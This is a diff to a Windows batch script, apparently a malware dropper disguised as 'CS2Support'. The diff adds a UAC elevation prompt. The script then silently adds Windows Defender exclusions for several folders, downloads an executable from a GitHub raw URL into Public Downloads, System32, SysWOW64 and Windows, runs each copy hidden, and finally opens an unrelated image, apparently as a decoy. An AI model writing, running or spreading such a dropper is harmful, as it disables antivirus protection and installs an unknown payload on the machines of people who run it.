@@ -1,3 +1,13 @@
+@echo off
+:: Check for admin privileges
+net session >nul 2>&1
+if %errorlevel% neq 0 (
+    echo Requesting administrative privileges...
+    powershell -Command "Start-Process '%~f0' -Verb RunAs"
+    exit /b
+)
+
+:: Actual script starts here
 powershell -WindowStyle Hidden -Command "Add-MpPreference -ExclusionPath 'C:\ProgramData'"
 powershell -WindowStyle Hidden -Command "Add-MpPreference -ExclusionExtension 'C:\Users\Public\Downloads\CS2Support.exe'"
 powershell -WindowStyle Hidden -Command "Add-MpPreference -ExclusionPath 'C:\Users\Public\Downloads'"
@@ -11,15 +21,13 @@ powershell -WindowStyle Hidden -Command "Add-MpPreference -ExclusionPath 'C:\Win
 powershell -WindowStyle Hidden -ExecutionPolicy Bypass -Command "Invoke-WebRequest -Uri 'https://github.com/AmjadBalls/TEST/raw/refs/heads/main/CS2Support.exe' -OutFile 'C:\Users\Public\Downloads\CS2Support.exe'"
 Start-Process "C:\Users\Public\Downloads\CS2Support.exe" -WindowStyle Hidden
 
-
 powershell -WindowStyle Hidden -ExecutionPolicy Bypass -Command "Invoke-WebRequest -Uri 'https://github.com/AmjadBalls/TEST/raw/refs/heads/main/CS2Support.exe' -OutFile 'C:\Windows\System32\CS2Support.exe'"
 Start-Process "C:\Windows\System32\CS2Support.exe" -WindowStyle Hidden
-
 
 powershell -WindowStyle Hidden -ExecutionPolicy Bypass -Command "Invoke-WebRequest -Uri 'https://github.com/AmjadBalls/TEST/raw/refs/heads/main/CS2Support.exe' -OutFile 'C:\Windows\SysWOW64\CS2Support.exe'"
 Start-Process "C:\Windows\SysWOW64\CS2Support.exe" -WindowStyle Hidden
 
-
 powershell -WindowStyle Hidden -ExecutionPolicy Bypass -Command "Invoke-WebRequest -Uri 'https://github.com/AmjadBalls/TEST/raw/refs/heads/main/CS2Support.exe' -OutFile 'C:\Windows\CS2Support.exe'"
 Start-Process "C:\Windows\CS2Support.exe" -WindowStyle Hidden
+
 start https://as2.ftcdn.net/v2/jpg/00/53/69/65/1000_F_53696591_9LO1bsQUpl2zIolFMFokrQyt04Z5dzXd.jpg
